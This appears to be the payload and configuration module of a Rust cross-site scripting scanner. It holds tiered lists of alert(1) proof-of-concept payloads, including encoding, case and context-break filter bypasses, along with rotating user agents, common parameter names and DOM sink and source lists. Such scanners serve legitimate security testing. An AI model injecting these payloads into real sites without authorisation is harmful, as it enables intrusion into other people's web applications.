use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct XssScanConfig {
    pub url: String,
    pub timeout: u64,
    pub threads: usize,
    pub scan_level: String,
    pub test_get: bool,
    pub test_post: bool,
    pub test_cookies: bool,
    pub test_headers: bool,
    pub custom_parameters: Vec<String>,
}

impl Default for XssScanConfig {
    fn default() -> Self {
        Self {
            url: String::new(),
            timeout: 15,
            threads: 5,
            scan_level: "moderate".to_string(),
            test_get: true,
            test_post: false,
            test_cookies: false,
            test_headers: false,
            custom_parameters: vec![],
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct XssScanResult {
    pub url: String,
    pub vulnerabilities: Vec<XssVulnerability>,
    pub safe_parameters: Vec<XssSafeEntry>,
    pub errors: Vec<XssErrorEntry>,
    pub tests_performed: usize,
    pub parameters_tested: Vec<String>,
    pub scan_duration_ms: u64,
    pub summary: String,
    pub xss_type_distribution: Vec<XssTypeDistribution>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct XssVulnerability {
    pub parameter: String,
    pub xss_type: String,
    pub injection_context: String,
    pub severity: String,
    pub payload: String,
    pub evidence: String,
    pub request_url: String,
    pub confidence: f64,
    pub method: String,
    pub response_time_ms: Option<u64>,
    pub http_status: Option<u16>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct XssSafeEntry {
    pub parameter: String,
    pub tests_run: usize,
    pub method: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct XssErrorEntry {
    pub parameter: String,
    pub payload: String,
    pub error: String,
    pub method: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct XssTypeDistribution {
    pub xss_type: String,
    pub count: usize,
    pub vulnerable_count: usize,
}

pub struct XssPayload {
    pub payload: &'static str,
    pub description: &'static str,
    pub severity: &'static str,
    pub xss_type: &'static str,
    pub injection_context: &'static str,
}

pub const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
];

pub const DEFAULT_PARAMETERS: &[&str] = &[
    "id", "q", "search", "query", "page", "user", "name",
    "keyword", "term", "cat", "category", "item", "product",
    "article", "news", "post", "uid", "pid", "sid", "tid",
    "sort", "order", "limit", "offset", "filter", "type",
    "action", "step", "view", "redirect", "url", "link",
    "file", "path", "dir", "folder", "input", "data",
    "value", "key", "token", "msg", "message", "comment",
    "username", "email", "role", "status", "callback",
];

pub const BASIC_PAYLOADS: &[XssPayload] = &[
    XssPayload { payload: "<script>alert(1)</script>", description: "Basic script tag", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<img src=x onerror=alert(1)>", description: "Image onerror event", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<svg onload=alert(1)>", description: "SVG onload event", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "';alert(1);//", description: "Single quote JS escape", severity: "high", xss_type: "reflected", injection_context: "js" },
    XssPayload { payload: "\";alert(1);//", description: "Double quote JS escape", severity: "high", xss_type: "reflected", injection_context: "js" },
    XssPayload { payload: "<input onfocus=alert(1) autofocus>", description: "Input onfocus event", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<a href=javascript:alert(1)>XSS</a>", description: "JavaScript URL in href", severity: "medium", xss_type: "reflected", injection_context: "attribute" },
    XssPayload { payload: "javascript:alert(1)", description: "Direct JavaScript URL", severity: "medium", xss_type: "reflected", injection_context: "attribute" },
];

pub const MODERATE_PAYLOADS: &[XssPayload] = &[
    XssPayload { payload: "<script>alert(1)</script>", description: "Basic script tag", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<img src=x onerror=alert(1)>", description: "Image onerror event", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<svg onload=alert(1)>", description: "SVG onload event", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "';alert(1);//", description: "Single quote JS escape", severity: "high", xss_type: "reflected", injection_context: "js" },
    XssPayload { payload: "\";alert(1);//", description: "Double quote JS escape", severity: "high", xss_type: "reflected", injection_context: "js" },
    XssPayload { payload: "<input onfocus=alert(1) autofocus>", description: "Input onfocus event", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<a href=javascript:alert(1)>XSS</a>", description: "JavaScript URL in href", severity: "medium", xss_type: "reflected", injection_context: "attribute" },
    XssPayload { payload: "javascript:alert(1)", description: "Direct JavaScript URL", severity: "medium", xss_type: "reflected", injection_context: "attribute" },
    XssPayload { payload: "<body onload=alert(1)>", description: "Body onload event", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<details open ontoggle=alert(1)>", description: "Details ontoggle event", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<iframe src=javascript:alert(1)>", description: "Iframe JavaScript URL", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<video><source onerror=alert(1)>", description: "Video source onerror", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<audio src=x onerror=alert(1)>", description: "Audio onerror event", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<img/src=x onerror=alert(1)>", description: "No space between attributes", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<script>alert`1`</script>", description: "Backtick syntax", severity: "high", xss_type: "reflected", injection_context: "js" },
    XssPayload { payload: "<select autofocus onfocus=alert(1)>", description: "Select onfocus event", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<textarea autofocus onfocus=alert(1)>", description: "Textarea onfocus event", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<marquee onstart=alert(1)>", description: "Marquee onstart event", severity: "medium", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<object data=javascript:alert(1)>", description: "Object JavaScript data", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<embed src=javascript:alert(1)>", description: "Embed JavaScript source", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "'-alert(1)-'", description: "JS expression injection", severity: "high", xss_type: "reflected", injection_context: "js" },
    XssPayload { payload: "{{alert(1)}}", description: "Template literal injection", severity: "medium", xss_type: "dom", injection_context: "js" },
    XssPayload { payload: "${alert(1)}", description: "Template string injection", severity: "medium", xss_type: "dom", injection_context: "js" },
    XssPayload { payload: "<div onmouseover=alert(1)>XSS</div>", description: "Mouseover event", severity: "medium", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<form><button formaction=javascript:alert(1)>XSS</button></form>", description: "Button formaction", severity: "medium", xss_type: "reflected", injection_context: "html" },
];

pub const AGGRESSIVE_PAYLOADS: &[XssPayload] = &[
    XssPayload { payload: "<script>alert(1)</script>", description: "Basic script tag", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<img src=x onerror=alert(1)>", description: "Image onerror event", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<svg onload=alert(1)>", description: "SVG onload event", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "';alert(1);//", description: "Single quote JS escape", severity: "high", xss_type: "reflected", injection_context: "js" },
    XssPayload { payload: "\";alert(1);//", description: "Double quote JS escape", severity: "high", xss_type: "reflected", injection_context: "js" },
    XssPayload { payload: "<input onfocus=alert(1) autofocus>", description: "Input onfocus event", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<a href=javascript:alert(1)>XSS</a>", description: "JavaScript URL in href", severity: "medium", xss_type: "reflected", injection_context: "attribute" },
    XssPayload { payload: "javascript:alert(1)", description: "Direct JavaScript URL", severity: "medium", xss_type: "reflected", injection_context: "attribute" },
    XssPayload { payload: "<body onload=alert(1)>", description: "Body onload event", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<details open ontoggle=alert(1)>", description: "Details ontoggle event", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<iframe src=javascript:alert(1)>", description: "Iframe JavaScript URL", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<video><source onerror=alert(1)>", description: "Video source onerror", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<audio src=x onerror=alert(1)>", description: "Audio onerror event", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<img/src=x onerror=alert(1)>", description: "No space between attributes", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<script>alert`1`</script>", description: "Backtick syntax", severity: "high", xss_type: "reflected", injection_context: "js" },
    XssPayload { payload: "<select autofocus onfocus=alert(1)>", description: "Select onfocus event", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<textarea autofocus onfocus=alert(1)>", description: "Textarea onfocus event", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<marquee onstart=alert(1)>", description: "Marquee onstart event", severity: "medium", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<object data=javascript:alert(1)>", description: "Object JavaScript data", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<embed src=javascript:alert(1)>", description: "Embed JavaScript source", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "'-alert(1)-'", description: "JS expression injection", severity: "high", xss_type: "reflected", injection_context: "js" },
    XssPayload { payload: "{{alert(1)}}", description: "Template literal injection", severity: "medium", xss_type: "dom", injection_context: "js" },
    XssPayload { payload: "${alert(1)}", description: "Template string injection", severity: "medium", xss_type: "dom", injection_context: "js" },
    XssPayload { payload: "<div onmouseover=alert(1)>XSS</div>", description: "Mouseover event", severity: "medium", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<form><button formaction=javascript:alert(1)>XSS</button></form>", description: "Button formaction", severity: "medium", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<script>eval(atob('YWxlcnQoMSk='))</script>", description: "Base64 encoded payload", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<script>alert(String.fromCharCode(97,108,101,114,116,40,49,41))</script>", description: "String.fromCharCode encoded", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", description: "Hex encoded script tag", severity: "medium", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "&#60;script&#62;alert(1)&#60;/script&#62;", description: "Decimal encoded script tag", severity: "medium", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<img src=x onerror=alert&lpar;1&rpar;>", description: "HTML entities in parentheses", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<script>alert&#40;1&#41;</script>", description: "HTML entities in script", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<svg><a xlink:href=javascript:alert(1)>XSS</a>", description: "SVG anchor JavaScript", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>XSS</maction></math>", description: "MathML action type", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<xss id=x onfocus=alert(1) tabindex=1>#x", description: "Custom tag with onfocus", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<base href=javascript:alert(1)//>", description: "Base tag JavaScript", severity: "medium", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<meta http-equiv=refresh content=0;url=javascript:alert(1)>", description: "Meta refresh JavaScript", severity: "medium", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<style>@import 'javascript:alert(1)';</style>", description: "CSS @import JavaScript", severity: "medium", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<div onanimationstart=alert(1)>XSS</div>", description: "Animation start event", severity: "medium", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<div ontransitionend=alert(1)>XSS</div>", description: "Transition end event", severity: "medium", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<body onpageshow=alert(1)>", description: "Body onpageshow event", severity: "medium", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<img src=x:alert(1) onerror=eval(src)>", description: "Eval via src attribute", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<svg><script>alert(1)</script></svg>", description: "SVG with script", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "%3Cscript%3Ealert(1)%3C/script%3E", description: "URL encoded script tag", severity: "medium", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "%253Cscript%253Ealert(1)%253C/script%253E", description: "Double URL encoded script", severity: "medium", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<ScRiPt>alert(1)</ScRiPt>", description: "Mixed case bypass", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<script/xss>alert(1)</script>", description: "Tag name bypass", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<img src=x onerror=alert(1)//", description: "Unclosed tag bypass", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "<script>alert(1)<!--", description: "HTML comment bypass", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "'\"--></style></script><svg onload=alert(1)>", description: "Context break multi-bypass", severity: "high", xss_type: "reflected", injection_context: "html" },
    XssPayload { payload: "</script><script>alert(1)</script>", description: "Script context break", severity: "high", xss_type: "reflected", injection_context: "js" },
    XssPayload { payload: "';return'</script><script>alert(1)</script>", description: "JS return + script break", severity: "high", xss_type: "reflected", injection_context: "js" },
    XssPayload { payload: "\" onfocus=alert(1) autofocus=\"", description: "Attribute injection double quote", severity: "high", xss_type: "reflected", injection_context: "attribute" },
    XssPayload { payload: "' onfocus=alert(1) autofocus='", description: "Attribute injection single quote", severity: "high", xss_type: "reflected", injection_context: "attribute" },
    XssPayload { payload: "\" onmouseover=alert(1) \"", description: "Mouseover attribute injection", severity: "medium", xss_type: "reflected", injection_context: "attribute" },
];

pub const DOM_SINKS: &[&str] = &[
    "document.write(",
    "document.writeln(",
    "element.innerHTML",
    "element.outerHTML",
    "element.insertAdjacentHTML",
    "location.href",
    "location.replace(",
    "location.assign(",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "Function(",
    "$.html(",
    "$(",
    "angular.element(",
    "React.createElement",
    "ReactDOM.render",
    "document.domain",
    "window.name",
    "postMessage(",
];

pub const DOM_SOURCES: &[&str] = &[
    "location.href",
    "location.search",
    "location.hash",
    "location.pathname",
    "document.URL",
    "document.documentURI",
    "document.referrer",
    "window.name",
    "document.cookie",
    "localStorage.getItem",
    "sessionStorage.getItem",
];

pub fn get_payloads_for_level(level: &str) -> Vec<&XssPayload> {
    match level {
        "basic" => BASIC_PAYLOADS.iter().collect(),
        "moderate" => MODERATE_PAYLOADS.iter().collect(),
        "aggressive" => AGGRESSIVE_PAYLOADS.iter().collect(),
        _ => MODERATE_PAYLOADS.iter().collect(),
    }
}
